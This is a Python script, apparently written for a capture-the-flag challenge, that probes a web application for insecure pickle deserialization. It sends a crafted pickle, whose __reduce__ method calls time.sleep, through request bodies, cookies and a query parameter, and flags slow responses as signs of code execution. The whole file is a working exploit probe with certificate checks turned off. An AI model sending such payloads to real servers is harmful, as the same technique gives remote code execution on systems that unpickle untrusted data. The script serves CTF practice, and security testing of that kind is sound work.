import requests, pickle, time, base64
requests.packages.urllib3.disable_warnings()
H="kicyber-2bccd62e5d76-granny-makes-food-0-0.chals.io"
URL=f"https://{H}/"
class S:
    def __reduce__(self): return (time.sleep,(15,))
raw=pickle.dumps(S()); b64=base64.b64encode(raw).decode()
def run(desc, method, path, data, ct, cookies=None):
    t0=time.time()
    try:
        r=requests.request(method, URL.rstrip("/")+path, data=data,
                           headers={"Content-Type":ct} if ct else None,
                           cookies=cookies, timeout=25, verify=False)
        dt=round(time.time()-t0,2)
        print(f"{desc}: {dt}s -> {r.status_code} {len(r.content)} {'<<< EXECUTED?!' if dt>10 else ''}")
    except Exception as e:
        print(f"{desc}: {round(time.time()-t0,2)}s ERR {repr(e)[:50]}")
run("POST/ rawpickle","POST","/",raw,"application/octet-stream")
run("POST/login rawpickle","POST","/login",raw,"application/octet-stream")
run("GET/ rawpickle-body","GET","/",raw,"application/octet-stream")
run("cookie session rawpickle","GET","/",None,None,{"session":b64})
run("cookie pickle rawpickle","GET","/",None,None,{"pickle":b64})
run("param user=rawpickle","GET","/?user="+raw.hex(),None,None,None)
